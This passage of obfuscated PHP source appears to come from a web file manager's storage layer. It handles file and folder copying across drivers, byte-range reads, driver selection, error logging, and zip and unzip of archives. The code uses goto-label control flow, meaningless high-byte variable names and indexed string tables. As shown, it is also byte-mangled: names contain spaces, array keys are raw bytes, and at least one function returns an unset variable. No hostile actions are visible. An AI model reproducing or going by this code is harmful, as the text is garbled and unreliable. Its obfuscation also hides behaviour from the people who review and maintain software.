Û“‰ßä, $fŒÖ‹ø¦Åø, $E§ÔÑ¢‡, $CÕÈÏÄŸ²â, $D¤ìŠÛ¥÷Ü, $cò„Àó¶Í“, $bù³Ø”ŒŠ = false) { goto CâÍÄ›ÄÏŒ; eÀ¾Üõ”: $cÓ¦Å‰Í’Ë = $fŒÖ‹ø¦Åø->mkdir($fŒÖ‹ø¦Åø->getPath($B©¹Ôà¯)); $E§ÔÑ¢‡ = $fŒÖ‹ø¦Åø->getPathInner($cÓ¦Å‰Í’Ë); $Dğ“Ó¦“Ğ‰ = $EÌÆù•ºó->listPath($AÏ Û“‰ßä, !0); goto FÙ¹‰á…µÇ; FÙ¹‰á…µÇ: $b©ÜâÀˆ¹° = array_merge($Dğ“Ó¦“Ğ‰[$DÀîÆ•µß[73]], $Dğ“Ó¦“Ğ‰[$DÀîÆ•µß[74]]); foreach ($b©ÜâÀˆ¹° as $bÂ¦‡ß °‰) { $BÆñ¦İ«Ğî = $bÂ¦‡ß °‰[$DÀîÆ•µß[29]] == $DÀîÆ•µß[173]; $AÏ Û“‰ßä = $EÌÆù•ºó->getPathInner($bÂ¦‡ß °‰[$DÀîÆ•µß[75]]); $b‰ÀØù‹æ = self::copyPath($EÌÆù•ºó, $AÏ Û“‰ßä, $fŒÖ‹ø¦Åø, $E§ÔÑ¢‡, $CÕÈÏÄŸ²â, $D¤ìŠÛ¥÷Ü, $BÆñ¦İ«Ğî); if (!$b‰ÀØù‹æ) { IO::errorTips($DÀîÆ•µß[1027] . $AÏ Û“‰ßä . $DÀîÆ•µß[66] . $E§ÔÑ¢‡); } } return $cÓ¦Å‰Í’Ë; goto d—Áíî›ôŞ; CâÍÄ›ÄÏŒ: $DÀîÆ•µß =& $_SERVER[¢ÌÛ]; $f…’™‰öŞ§ = $bù³Ø”ŒŠ ? $bù³Ø”ŒŠ : $EÌÆù•ºó->pathThis($AÏ Û“‰ßä); if ($CÕÈÏÄŸ²â) { $A”Åˆëİùğ = $fŒÖ‹ø¦Åø->fileNameExist($E§ÔÑ¢‡, $f…’™‰öŞ§); $f…’™‰öŞ§ = $fŒÖ‹ø¦Åø->fileNameAuto($E§ÔÑ¢‡, $f…’™‰öŞ§, $CÕÈÏÄŸ²â, !$cò„Àó¶Í“); $CÕÈÏÄŸ²â = $A”Åˆëİùğ ? $CÕÈÏÄŸ²â : !1; } goto eÄí‚ÊÌ½±; eÄí‚ÊÌ½±: if ($cò„Àó¶Í“) { return self::copyFile($EÌÆù•ºó, $AÏ Û“‰ßä, $fŒÖ‹ø¦Åø, $E§ÔÑ¢‡, $f…’™‰öŞ§, $D¤ìŠÛ¥÷Ü); } if ($CÕÈÏÄŸ²â == REPEAT_RENAME_FOLDER) { $CÕÈÏÄŸ²â = !1; } $B©¹Ôà¯ = rtrim($E§ÔÑ¢‡, $DÀîÆ•µß[8]) . $DÀîÆ•µß[8] . $f…’™‰öŞ§; goto eÀ¾Üõ”; d—Áíî›ôŞ: } private static function copyFile($EŠàÈ¥Î•, $B¹˜­öÆ, $eÙØ²ôµø¿, $f¥íÑªÕ‡Ğ, $CÂ°Å ÀË‡, $dá¬âÓ¯) { goto dòæ ›‚Ì¿; AÏ”Å‚‘: $C´é‘îĞ = $EŠàÈ¥Î•->iconvApp($C´é‘îĞ); $Céˆ‹¨– = $eÙØ²ôµø¿->upload($f¥íÑªÕ‡Ğ, $C´é‘îĞ, $dá¬âÓ¯); self::remove($eŒ•·¶‹ÔÚ . $cÛ¿¹øÜîØ); goto d­œğ—øéÁ; AÍ ÃˆŒ¾Ç: mk_dir($eŒ•·¶‹ÔÚ); $C´é‘îĞ = $eŒ•·¶‹ÔÚ . $cÛ¿¹øÜîØ; $C´é‘îĞ = $EŠàÈ¥Î•->download($B¹˜­öÆ, $C´é‘îĞ); goto AÏ”Å‚‘; d­œğ—øéÁ: Hook::trigger($a˜ÍƒßÜ¤[1030], $EŠàÈ¥Î•, $B¹˜­öÆ, $eÙØ²ôµø¿, $f¥íÑªÕ‡Ğ, $CÂ°Å ÀË‡, $Céˆ‹¨–); return $Céˆ‹¨–; goto bùÉ¬Ú˜Ü; dòæ ›‚Ì¿: $a˜ÍƒßÜ¤ =& $_SERVER[¢ÌÛ]; $f¥íÑªÕ‡Ğ = $eÙØ²ôµø¿->getPath(rtrim($f¥íÑªÕ‡Ğ, $a˜ÍƒßÜ¤[8]) . $a˜ÍƒßÜ¤[8] . $CÂ°Å ÀË‡); $cÛ¿¹øÜîØ = $a˜ÍƒßÜ¤[1028] . time() . rand_string(5); goto E‘¯±Ö¹Â; E‘¯±Ö¹Â: Hook::trigger($a˜ÍƒßÜ¤[1029], $EŠàÈ¥Î•, $B¹˜­öÆ, $eÙØ²ôµø¿, $f¥íÑªÕ‡Ğ, $CÂ°Å ÀË‡, $cÛ¿¹øÜîØ); if (self::driverIsSame($EŠàÈ¥Î•, $eÙØ²ôµø¿)) { if ($dá¬âÓ¯) { $Céˆ‹¨– = $eÙØ²ôµø¿->moveFile($B¹˜­öÆ, $f¥íÑªÕ‡Ğ); } else { $Céˆ‹¨– = $eÙØ²ôµø¿->copyFile($B¹˜­öÆ, $f¥íÑªÕ‡Ğ); } Hook::trigger($a˜ÍƒßÜ¤[1030], $EŠàÈ¥Î•, $B¹˜­öÆ, $eÙØ²ôµø¿, $f¥íÑªÕ‡Ğ, $CÂ°Å ÀË‡, $Céˆ‹¨–); return $Céˆ‹¨–; } $eŒ•·¶‹ÔÚ = TEMP_FILES; goto AÍ ÃˆŒ¾Ç; bùÉ¬Ú˜Ü: } public static function pathFather($BÃ‘ö×÷) { $E˜Ù­²–Ù = IO::init($BÃ‘ö×÷); $C²³°çéº¦ = $E˜Ù­²–Ù->pathFather($E˜Ù­²–Ù->path); return $E˜Ù­²–Ù->getPathOuter($C²³°çéº¦); } public static function fileOut($E™ÊÈÙ ‚§, $c‡„ç¨ÓÇÉ = false, $CÀº¶ãğ = false, $FïˆÏôå = '') { $bÂ»š°Éáê = self::driverMake($E™ÊÈÙ ‚§); if ($bÂ»š°Éáê->isFileOutServer()) { return $bÂ»š°Éáê->fileOutServer($E™ÊÈÙ ‚§, $c‡„ç¨ÓÇÉ, $CÀº¶ãğ, $FïˆÏôå); } return $bÂ»š°Éáê->fileOut($E™ÊÈÙ ‚§, $c‡„ç¨ÓÇÉ, $CÀº¶ãğ, $FïˆÏôå); } public static function fileOutImage($C‡Öé±´±, $e•ßİÒ„µ· = 250) { $bÖîÃ¶²î“ = array(250, 600, 1200, 3000, 5000); for ($F‡µŠš›‰æ = 0; $F‡µŠš›‰æ < count($bÖîÃ¶²î“); $F‡µŠš›‰æ++) { if ($F‡µŠš›‰æ == 0 && $e•ßİÒ„µ· <= $bÖîÃ¶²î“[$F‡µŠš›‰æ]) { $e•ßİÒ„µ· = $bÖîÃ¶²î“[$F‡µŠš›‰æ]; break; } else { if ($e•ßİÒ„µ· > $bÖîÃ¶²î“[$F‡µŠš›‰æ - 1] && $e•ßİÒ„µ· <= $bÖîÃ¶²î“[$F‡µŠš›‰æ]) { $e•ßİÒ„µ· = $bÖîÃ¶²î“[$F‡µŠš›‰æ]; break; } else { if ($F‡µŠš›‰æ == count($bÖîÃ¶²î“) - 1 && $e•ßİÒ„µ· > $bÖîÃ¶²î“[$F‡µŠš›‰æ]) { $e•ßİÒ„µ· = $bÖîÃ¶²î“[$F‡µŠš›‰æ]; break; } } } } $A‹ÏØ¿˜‘© = self::driverMake($C‡Öé±´±); if ($A‹ÏØ¿˜‘©->isFileOutServer()) { return $A‹ÏØ¿˜‘©->fileOutImageServer($C‡Öé±´±, $e•ßİÒ„µ·); } return $A‹ÏØ¿˜‘©->fileOutImage($C‡Öé±´±, $e•ßİÒ„µ·); } private static function driverIsSame($f…×½‹„¦ë, $Bî¹ÀšÚ«) { goto a¡Ã‹´œÄÉ; BÁîĞ…¤Œ‹: if ($aõğ‡‹«ñÜ != $EèáñôÒÂÏ) { return !1; } if ($aõğ‡‹«ñÜ == $eÎãòŠˆ²Š[717]) { return !0; } if ($aõğ‡‹«ñÜ == $eÎãòŠˆ²Š[105]) { return !0; } goto D¹œÇŸãø; a¡Ã‹´œÄÉ: $eÎãòŠˆ²Š =& $_SERVER[¢ÌÛ]; $aõğ‡‹«ñÜ = $f…×½‹„¦ë->getType(); $EèáñôÒÂÏ = $Bî¹ÀšÚ«->getType(); goto BÁîĞ…¤Œ‹; D¹œÇŸãø: if ($f…×½‹„¦ë->pathDriver == $Bî¹ÀšÚ«->pathDriver) { return !0; } return !1; goto döÏŸ¥éƒ; döÏŸ¥éƒ: } public static function copyUpdate($aˆç”è¯»î, $c¬„ï˜¢¦Û) { goto fÙì•÷èƒ; fÙì•÷èƒ: $A©´–¢³âˆ =& $_SERVER[¢ÌÛ]; if (!IO::exist($aˆç”è¯»î)) { return !1; } if (!IO::exist($c¬„ï˜¢¦Û)) { IO::mkdir($c¬„ï˜¢¦Û); } goto FÆ’ÒÇùáÑ; dô§¸„ñå†: Hook::trigger($A©´–¢³âˆ[1034], $aˆç”è¯»î, $c¬„ï˜¢¦Û, $cÄÅ·à¼ôŠ); foreach ($BÓõÊŠï”Ü as $có¹Ç¢ğŠ¶) { IO::mkdir($có¹Ç¢ğŠ¶); } foreach ($d„ææÃÂ«„ as $có¹Ç¢ğŠ¶) { IO::copy($có¹Ç¢ğŠ¶[$A©´–¢³âˆ[1031]], $có¹Ç¢ğŠ¶[$A©´–¢³âˆ[1032]], REPEAT_REPLACE); } goto b¦ƒñŞ˜ƒº; FÆ’ÒÇùáÑ: $FÕ¤Ââßî† = self::_listAll($aˆç”è¯»î); $b„¾š¡š¾Ø = self::_listAll($c¬„ï˜¢¦Û); $d„ææÃÂ«„ = array(); goto aó ÇØŸí©; aó ÇØŸí©: $BÓõÊŠï”Ü = array(); foreach ($FÕ¤Ââßî† as $BÕ‡¯ò•¼‰ => $có¹Ç¢ğŠ¶) { if (isset($b„¾š¡š¾Ø[$BÕ‡¯ò•¼‰])) { if ($có¹Ç¢ğŠ¶[$A©´–¢³âˆ[76]] == 1) { continue; } if ($b„¾š¡š¾Ø[$BÕ‡¯ò•¼‰][$A©´–¢³âˆ[77]] == $có¹Ç¢ğŠ¶[$A©´–¢³âˆ[77]]) { continue; } } if ($có¹Ç¢ğŠ¶[$A©´–¢³âˆ[76]] == 1) { $BÓõÊŠï”Ü[] = $c¬„ï˜¢¦Û . $A©´–¢³âˆ[8] . $BÕ‡¯ò•¼‰; continue; } $F´ÉÚë¼Ş = strstr(trim($BÕ‡¯ò•¼‰, $A©´–¢³âˆ[8]), $A©´–¢³âˆ[8]) ? get_path_father($BÕ‡¯ò•¼‰) : $A©´–¢³âˆ[33]; $d„ææÃÂ«„[] = array($A©´–¢³âˆ[1031] => $có¹Ç¢ğŠ¶[$A©´–¢³âˆ[75]], $A©´–¢³âˆ[1032] => rtrim($c¬„ï˜¢¦Û, $A©´–¢³âˆ[8]) . $A©´–¢³âˆ[8] . $F´ÉÚë¼Ş, $A©´–¢³âˆ[1033] => $có¹Ç¢ğŠ¶); } $cÄÅ·à¼ôŠ = array($A©´–¢³âˆ[173] => $d„ææÃÂ«„, $A©´–¢³âˆ[76] => $BÓõÊŠï”Ü); goto dô§¸„ñå†; b¦ƒñŞ˜ƒº: } private static function _listAll($EŞ„éİÃÎ) { $eªóÕ±­Õ² =& $_SERVER[¢ÌÛ]; $EŞ„éİÃÎ = KodIO::clear($EŞ„éİÃÎ); $e×ŠË…›–† = IO::listAll($EŞ„éİÃÎ); foreach ($e×ŠË…›–† as &$B§È±ğÖô) { $B½ÎÃÑğÜÆ = substr($B§È±ğÖô[$eªóÕ±­Õ²[75]], strlen($EŞ„éİÃÎ)); $B§È±ğÖô[$eªóÕ±­Õ²[1035]] = trim($B½ÎÃÑğÜÆ, $eªóÕ±­Õ²[8]); } unset($B§È±ğÖô); return array_to_keyvalue($e×ŠË…›–†, $eªóÕ±­Õ²[1035]); } public static function fileSubstr($CÔ²à¥¼æ°, $fÄôÉÂÓ¸, $A’¬Ù‹¥ = false) { goto f¿Ú›åÇô‰; f¿Ú›åÇô‰: $d–çÅ¿²É´ =& $_SERVER[¢ÌÛ]; $e Ä¬ÕÌĞ• = self::driverMake($CÔ²à¥¼æ°); $aÏãİÆã‰ = $e Ä¬ÕÌĞ•->size($CÔ²à¥¼æ°); goto aö‰‹¤›Î§; e¤ÅËÍôŠ˜: if (!$aÈŒ©×¨‹ && $A’¬Ù‹¥ && isset($GLOBALS[$d–çÅ¿²É´[1038]])) { throw new Exception($GLOBALS[$d–çÅ¿²É´[1038]][$d–çÅ¿²É´[1039]]); } return $aÈŒ©×¨‹; goto FŠâƒ±´´§; EÃÔ…¹¾: if ($A’¬Ù‹¥ <= 0) { return $d–çÅ¿²É´[33]; } if ($fÄôÉÂÓ¸ < 0 || $fÄôÉÂÓ¸ >= $aÏãİÆã‰ || $A’¬Ù‹¥ > 1024 * 1024 * 5) { throw new Exception("\x66\x69\154\145\x52\x65\141\x64\x20\x65\162\162\157\162\x21\40\163\164\141\x72\x74\75{$fÄôÉÂÓ¸}\x3b\154\x65\156\147\x74\150\x3d{$A’¬Ù‹¥}\x3b\x20\x73\151\172\x65\75{$aÏãİÆã‰}\x3b"); } $aÈŒ©×¨‹ = $e Ä¬ÕÌĞ•->fileSubstr($CÔ²à¥¼æ°, $fÄôÉÂÓ¸, $A’¬Ù‹¥); goto e¤ÅËÍôŠ˜; aö‰‹¤›Î§: $FÔôœµ³— = $fÄôÉÂÓ¸; $fæ’Ï›ÂÓ’ = $A’¬Ù‹¥; if ($fÄôÉÂÓ¸ < 0) { $fÄôÉÂÓ¸ = $aÏãİÆã‰ + $fÄôÉÂÓ¸; } goto F»Â¾æ÷ñä; F»Â¾æ÷ñä: if ($A’¬Ù‹¥ === !1) { $A’¬Ù‹¥ = $aÏãİÆã‰ - $fÄôÉÂÓ¸; } if ($fÄôÉÂÓ¸ + $A’¬Ù‹¥ > $aÏãİÆã‰) { $A’¬Ù‹¥ = $aÏãİÆã‰ - $fÄôÉÂÓ¸; } if (!$aÏãİÆã‰ && $e Ä¬ÕÌĞ•->getType() == $d–çÅ¿²É´[105] && !$e Ä¬ÕÌĞ•->exist($CÔ²à¥¼æ°)) { throw new Exception($d–çÅ¿²É´[1036] . LNG($d–çÅ¿²É´[1037])); } goto EÃÔ…¹¾; FŠâƒ±´´§: } private static function driverMake(&$bãî‹ñï–¶) { goto Fì…èæ™¼©; Fì…èæ™¼©: $BëÒ‘ˆàµ· =& $_SERVER[¢ÌÛ]; $C„¸—ŞùÁ = KodIO::parse($bãî‹ñï–¶); if (!self::$driverListSystem) { $Dà›†İ¿ˆƒ = Model($BëÒ‘ˆàµ·[726])->driverListSystem(); self::$driverListSystem = array_to_keyvalue($Dà›†İ¿ˆƒ, $BëÒ‘ˆàµ·[385]); } goto A°öˆ¢–â×; A°öˆ¢–â×: if ($C„¸—ŞùÁ[$BëÒ‘ˆàµ·[29]] == KodIO::KOD_IO && !self::$driverListSystem[$C„¸—ŞùÁ[$BëÒ‘ˆàµ·[385]]]) { return !1; } $bãî‹ñï–¶ = $C„¸—ŞùÁ[$BëÒ‘ˆàµ·[1040]]; $b×Êß´ƒ†ê = self::driverGet($C„¸—ŞùÁ, $bãî‹ñï–¶); goto c…–ìÈ; c…–ìÈ: return $b×Êß´ƒ†ê; goto A…µôĞ‘ÚØ; A…µôĞ‘ÚØ: } private static function driverGet($D‰Š³Ë±², &$F×Ì†êï¤) { goto BÓ‰½Ò°; BÓ‰½Ò°: $AÚìñõàâ— =& $_SERVER[¢ÌÛ]; $CÓÔõæ¹¡‚ = $D‰Š³Ë±²[$AÚìñõàâ—[1041]]; $fâˆÛÓ½®œ = $D‰Š³Ë±²[$AÚìñõàâ—[385]]; goto a¢ã‚É‰; eÅÖÎ–Âİù: $e†©ñŞù‡Ş = self::$driverCache[$a—çĞ©Ã´Ì]; $e†©ñŞù‡Ş->pathDriver = $CÓÔõæ¹¡‚; $e†©ñŞù‡Ş->pathBase = $AÚìñõàâ—[33]; goto e‡­ñ¬í÷î; e‡­ñ¬í÷î: if (isset($e¶¡ØîƒÀİ[$AÚìñõàâ—[6]][$AÚìñõàâ—[1052]])) { $e†©ñŞù‡Ş->pathBase = rtrim($e¶¡ØîƒÀİ[$AÚìñõàâ—[6]][$AÚìñõàâ—[1052]], $AÚìñõàâ—[8]) . $AÚìñõàâ—[8]; $F×Ì†êï¤ = $e†©ñŞù‡Ş->pathBase . ltrim($F×Ì†êï¤, $AÚìñõàâ—[8]); } $F×Ì†êï¤ = $e†©ñŞù‡Ş->getPath($F×Ì†êï¤); if (isset($D‰Š³Ë±²[$AÚìñõàâ—[1024]])) { $F×Ì†êï¤ = $D‰Š³Ë±²[$AÚìñõàâ—[1024]]; } goto Eö·ß•·Ó ; a¢ã‚É‰: switch ($D‰Š³Ë±²[$AÚìñõàâ—[29]]) { case KodIO::KOD_IO: $e¶¡ØîƒÀİ = self::$driverListSystem[$fâˆÛÓ½®œ]; break; case KodIO::KOD_SOURCE: $F×Ì†êï¤ = $fâˆÛÓ½®œ . $F×Ì†êï¤; $e¶¡ØîƒÀİ = array($AÚìñõàâ—[1042] => $AÚìñõàâ—[1043], $AÚìñõàâ—[6] => $D‰Š³Ë±²); break; case KodIO::KOD_USER_DRIVER: if (!self::$driverListUser) { $A«‡¨„ªİÙ = $GLOBALS[$AÚìñõàâ—[1044]]; self::$driverListUser = array_to_keyvalue($A«‡¨„ªİÙ, $AÚìñõàâ—[385]); } $e¶¡ØîƒÀİ = self::$driverListUser[$fâˆÛÓ½®œ]; break; case KodIO::KOD_SHARE_LINK: $e¶¡ØîƒÀİ = array($AÚìñõàâ—[1042] => $AÚìñõàâ—[1045], $AÚìñõàâ—[6] => $D‰Š³Ë±²); $D¥®ù‰ŞÅ‹ = Action($AÚìñõàâ—[1046])->sharePathInfo($D‰Š³Ë±²[$AÚìñõàâ—[75]]); $F×Ì†êï¤ = $D¥®ù‰ŞÅ‹[$AÚìñõàâ—[396]]; if (!$D¥®ù‰ŞÅ‹[$AÚìñõàâ—[396]]) { $EÎæğ›É = Model($AÚìñõàâ—[561])->getInfo($D¥®ù‰ŞÅ‹[$AÚìñõàâ—[466]]); $F×Ì†êï¤ = KodIO::clear($EÎæğ›É[$AÚìñõàâ—[1047]] . $D‰Š³Ë±²[$AÚìñõàâ—[1040]]); $D‰Š³Ë±²[$AÚìñõàâ—[464]] = $EÎæğ›É; $D‰Š³Ë±²[$AÚìñõàâ—[1024]] = $F×Ì†êï¤; $e¶¡ØîƒÀİ = array($AÚìñõàâ—[1042] => $AÚìñõàâ—[1048], $AÚìñõàâ—[6] => $D‰Š³Ë±²); } break; case KodIO::KOD_SHARE_ITEM: $e¶¡ØîƒÀİ = array($AÚìñõàâ—[1042] => $AÚìñõàâ—[1049], $AÚìñõàâ—[6] => $D‰Š³Ë±²); $EÎæğ›É = Model($AÚìñõàâ—[561])->getInfo($D‰Š³Ë±²[$AÚìñõàâ—[385]]); if ($EÎæğ›É[$AÚìñõàâ—[396]] == $AÚìñõàâ—[495]) { $F×Ì†êï¤ = KodIO::clear($EÎæğ›É[$AÚìñõàâ—[1047]] . $D‰Š³Ë±²[$AÚìñõàâ—[1040]]); $D‰Š³Ë±²[$AÚìñõàâ—[464]] = $EÎæğ›É; $D‰Š³Ë±²[$AÚìñõàâ—[1024]] = $F×Ì†êï¤; $e¶¡ØîƒÀİ = array($AÚìñõàâ—[1042] => $AÚìñõàâ—[1050], $AÚìñõàâ—[6] => $D‰Š³Ë±²); } else { if (!$F×Ì†êï¤) { $F×Ì†êï¤ = $EÎæğ›É[$AÚìñõàâ—[396]]; } } break; default: $F×Ì†êï¤ = $D‰Š³Ë±²[$AÚìñõàâ—[75]]; $e¶¡ØîƒÀİ = array($AÚìñõàâ—[1042] => $AÚìñõàâ—[1051]); break; } $a—çĞ©Ã´Ì = $D‰Š³Ë±²[$AÚìñõàâ—[75]]; if (!isset(self::$driverCache[$a—çĞ©Ã´Ì])) { $Eòô¬åÃğÄ = strtolower($e¶¡ØîƒÀİ[$AÚìñõàâ—[93]]); $bˆ¡ô„ï²Š = $GLOBALS[$AÚìñõàâ—[6]][$AÚìñõàâ—[87]][$AÚìñõàâ—[775]]; $FÈ»‡ÓÀĞÈ = $AÚìñõàâ—[71] . (isset($bˆ¡ô„ï²Š[$Eòô¬åÃğÄ]) ? $bˆ¡ô„ï²Š[$Eòô¬åÃğÄ] : ucfirst($Eòô¬åÃğÄ)); if (!class_exists($FÈ»‡ÓÀĞÈ)) { show_json("{$FÈ»‡ÓÀĞÈ}\40\156\157\164\40\x65\x78\x69\163\164\163\x21", !1); } $DäâÄÆ¿¹ = isset($e¶¡ØîƒÀİ[$AÚìñõàâ—[6]]) ? $e¶¡ØîƒÀİ[$AÚìñõàâ—[6]] : !1; self::$driverCache[$a—çĞ©Ã´Ì] = new $FÈ»‡ÓÀĞÈ($DäâÄÆ¿¹); } goto eÅÖÎ–Âİù; Eö·ß•·Ó : $e†©ñŞù‡Ş->path = $F×Ì†êï¤; return $e†©ñŞù‡Ş; goto cã¹ÊËÑÌŠ; cã¹ÊËÑÌŠ: } public static function errorTips($fËºĞéäó¶ = false) { goto dÀÎÌê™ğÕ; eÃ†ŞÉ™ê: $bò¡Ê—¨¤Š[] = $fËºĞéäó¶; write_log($dè‡ÀŒá ‰[159] . ACTION . $dè‡ÀŒá ‰[1053] . $fËºĞéäó¶, $dè‡ÀŒá ‰[1054]); goto eïÔÊ…¿Š; dÀÎÌê™ğÕ: $dè‡ÀŒá ‰ =& $_SERVER[¢ÌÛ]; static $bò¡Ê—¨¤Š = array(); $dë©™½Ç¡¦ = 1000; goto DÛ“¥“Å¿; DÛ“¥“Å¿: if ($fËºĞéäó¶ === -1) { return $bò¡Ê—¨¤Š ? $bò¡Ê—¨¤Š[count($bò¡Ê—¨¤Š) - 1] : $dè‡ÀŒá ‰[33]; } if ($fËºĞéäó¶ === !1) { return implode($dè‡ÀŒá ‰[227], $bò¡Ê—¨¤Š); } if (count($bò¡Ê—¨¤Š) >= $dë©™½Ç¡¦) { $bò¡Ê—¨¤Š = array_slice($bò¡Ê—¨¤Š, $dë©™½Ç¡¦ * 0.5, $dë©™½Ç¡¦); } goto eÃ†ŞÉ™ê; eïÔÊ…¿Š: } public static function getLastError($eÓ¤ÊéĞõì = '') { $E¯Š•ìõ× = self::errorTips(-1); return $E¯Š•ìõ× ? $E¯Š•ìõ× : $eÓ¤ÊéĞõì; } } class IOArchive extends IO { function __construct() { parent::__construct(); } private static function local() { static $E¼¾Ê™ÜĞ¾; if (!$E¼¾Ê™ÜĞ¾) { $F ’ˆ‡ÔñŸ = IO::init($_SERVER[¢ÌÛ][8]); } return $F ’ˆ‡ÔñŸ; } private static function iconvSystem($d«ê—ÉÏê) { return self::local()->iconvSystem($d«ê—ÉÏê); } private static function iconvApp($F¹à¡³¶Ñ–) { return self::local()->iconvApp($F¹à¡³¶Ñ–); } public static function zip($F‹ŠŸÁî³ò, $aí¥ÎàËøÀ = "\x7a\x69\x70", $d¥ó‚÷Œôî = '', $eØ÷ì½‰Ô„ = REPEAT_RENAME) { goto AÃ·¢„í…; cÈ‡”êÑ‰ã: if ($d¥ó‚÷Œôî || !$FôÑÈ×ŠÈ) { if ($FôÑÈ×ŠÈ && strstr($FôÑÈ×ŠÈ, TEMP_FILES)) { $Dš‚§Ä»¾¿ = $dË”¿Š = array(); recursion_dir($Dõ‘ô¨º¤, $Dš‚§Ä»¾¿, $dË”¿Š, 0); foreach ($Dš‚§Ä»¾¿ as $cˆåİ¤ë³) { del_dir($cˆåİ¤ë³); } foreach ($dË”¿Š as $EÂ¿¤ÔšÍ) { if ($EÂ¿¤ÔšÍ == $DÌ´µöî¿¹) { continue; } del_file($EÂ¿¤ÔšÍ); } } return $fÑŒ›«Î; } $BÅçÜ“¥Ä« = self::pathFather($C‡«ˆÕë×[$DÖ‰ƒ„Šµ[75]]); $dÌîÆ‘İ¨œ = self::move($fÑŒ›«Î, $BÅçÜ“¥Ä«, $eØ÷ì½‰Ô„); goto cïÃƒªÇÚÚ; AÃ·¢„í…: $DÖ‰ƒ„Šµ =& $_SERVER[¢ÌÛ]; $Cí¶é‚¤èö = self::init($F‹ŠŸÁî³ò[0][$DÖ‰ƒ„Šµ[75]]); $C‡«ˆÕë× = self::info($F‹ŠŸÁî³ò[0][$DÖ‰ƒ„Šµ[75]]); goto E‡’Ñ¿‚¹õ; A»ÆâÍã¬à: if (count($dË”¿Š) > 1) { $AÌ‘‡×¶Ï¹ = IO::info(IO::pathFather($C‡«ˆÕë×[$DÖ‰ƒ„Šµ[75]])); $Dæäæ©åó† = $AÌ‘‡×¶Ï¹[$DÖ‰ƒ„Šµ[28]]; } $Dõ‘ô¨º¤ = $FôÑÈ×ŠÈ; if (!$Dõ‘ô¨º¤) { $Dõ‘ô¨º¤ = get_path_father($C‡«ˆÕë×[$DÖ‰ƒ„Šµ[75]]); if (!$d¥ó‚÷Œôî && $Cí¶é‚¤èö->getType() == $DÖ‰ƒ„Šµ[105]) { $Dõ‘ô¨º¤ = get_path_father($Cí¶é‚¤èö->path); } $A™Ã½¥Û¦Ô = IO::info($Dõ‘ô¨º¤); if (!$A™Ã½¥Û¦Ô[$DÖ‰ƒ„Šµ[194]]) { show_json(LNG($DÖ‰ƒ„Šµ[1056]), !1); } } goto fÌ‚ø¯Š; E‡’Ñ¿‚¹õ: $FôÑÈ×ŠÈ = !1; if (!$d¥ó‚÷Œôî && $Cí¶é‚¤èö->getType() == $DÖ‰ƒ„Šµ[105]) { $dË”¿Š = self::zipFileList($F‹ŠŸÁî³ò); } else { $FôÑÈ×ŠÈ = $d¥ó‚÷Œôî ? $d¥ó‚÷Œôî : TEMP_FILES . $DÖ‰ƒ„Šµ[1055] . time() . rand_string(8) . $DÖ‰ƒ„Šµ[8]; mk_dir($FôÑÈ×ŠÈ); $dË”¿Š = self::zipFileList($F‹ŠŸÁî³ò, $FôÑÈ×ŠÈ); } $Dæäæ©åó† = $C‡«ˆÕë×[$DÖ‰ƒ„Šµ[28]]; goto A»ÆâÍã¬à; cïÃƒªÇÚÚ: if (!$dÌîÆ‘İ¨œ) { del_dir($FôÑÈ×ŠÈ); show_json(LNG($DÖ‰ƒ„Šµ[1057]), !1); } del_dir($FôÑÈ×ŠÈ); return $dÌîÆ‘İ¨œ; goto Fœáµ’‚Œ¥; fÌ‚ø¯Š: $fÑŒ›«Î = $Dõ‘ô¨º¤ . $Dæäæ©åó† . $DÖ‰ƒ„Šµ[94] . $aí¥ÎàËøÀ; $fÑŒ›«Î = get_filename_auto($fÑŒ›«Î, $DÖ‰ƒ„Šµ[33], $eØ÷ì½‰Ô„); $DÌ´µöî¿¹ = self::iconvSystem($fÑŒ›«Î); goto EÇˆƒ²©°; EÇˆƒ²©°: foreach ($dË”¿Š as $AÖ‰Õ‹ù«• => $Añë¢ªÃ) { $dË”¿Š[$AÖ‰Õ‹ù«•] = self::iconvSystem($Añë¢ªÃ); } KodArchive::create($DÌ´µöî¿¹, $dË”¿Š); if (!IO::exist($fÑŒ›«Î)) { if ($FôÑÈ×ŠÈ) { del_dir($FôÑÈ×ŠÈ); } show_json(LNG($DÖ‰ƒ„Šµ[1057]), !1); } goto cÈ‡”êÑ‰ã; Fœáµ’‚Œ¥: } public static function unzip($AÎåêã¿ñ…, $d’¹¥ÈÏ¿â = "\162\145\x70\x6c\141\x63\145") { goto c­­»Õñë¤; Eå‹’¼¼‘†: Hook::trigger($DõƒÑá‘³[1065], $DË®ë‡å¸Ì); recursion_dir($DË®ë‡å¸Ì, $BµÔğë†½½, $A¥ÀÙÓ»Š, 0); $b¬ñßÃŒ„‰ = array_merge($BµÔğë†½½, $A¥ÀÙÓ»Š); goto C™†œĞšŸô; C™†œĞšŸô: foreach ($b¬ñßÃŒ„‰ as $cÂ¢ÓÂ²†) { $cÂ¢ÓÂ²† = self::iconvApp($cÂ¢ÓÂ²†); self::move($cÂ¢ÓÂ²†, $dŠö”öÛ «, $d’¹¥ÈÏ¿â); } del_dir($DË®ë‡å¸Ì); if (!$aÒã½ ËœÓ) { del_file($B°—çêÊÂ); } goto fÛ¿É²Úø‹; C«õã†¯Øİ: $fÍŠ²½ì¢ = KodArchive::extract($B°—çêÊÂ, $DË®ë‡å¸Ì . $DõƒÑá‘³[8], $dæùÖ¦¸ÜÚ); self::archiveExt(); if (!$fÍŠ²½ì¢[$DõƒÑá‘³[1062]]) { show_json($DõƒÑá‘³[1063] . $fÍŠ²½ì¢[$DõƒÑá‘³[1064]], !1); } goto Eå‹’¼¼‘†; BÜª¶ßÙ‹ã: if (!($BÒÀ‚“¡»Ù = parent::info($fº‡¯ÚèÀ))) { show_json(LNG($DõƒÑá‘³[1059]), !1); } if (!($AµÀ…™ƒ¿‡ = parent::infoFull($dŠö”öÛ «))) { $dŠö”öÛ « = parent::mkdir($dŠö”öÛ «); $AµÀ…™ƒ¿‡ = array($DõƒÑá‘³[75] => $dŠö”öÛ «); } else { if (isset($AµÀ…™ƒ¿‡[$DõƒÑá‘³[396]]) && trim($AµÀ…™ƒ¿‡[$DõƒÑá‘³[75]], $DõƒÑá‘³[8]) != trim($dŠö”öÛ «, $DõƒÑá‘³[8])) { $A¼ÅÂ˜Ô™µ = KodIO::make($AµÀ…™ƒ¿‡[$DõƒÑá‘³[488]]); $bÊíË‡÷¶” = parent::fileNameAuto($A¼ÅÂ˜Ô™µ, $AµÀ…™ƒ¿‡[$DõƒÑá‘³[28]], REPEAT_RENAME_FOLDER, !0); $dŠö”öÛ « = parent::mkdir($A¼ÅÂ˜Ô™µ . $bÊíË‡÷¶”); 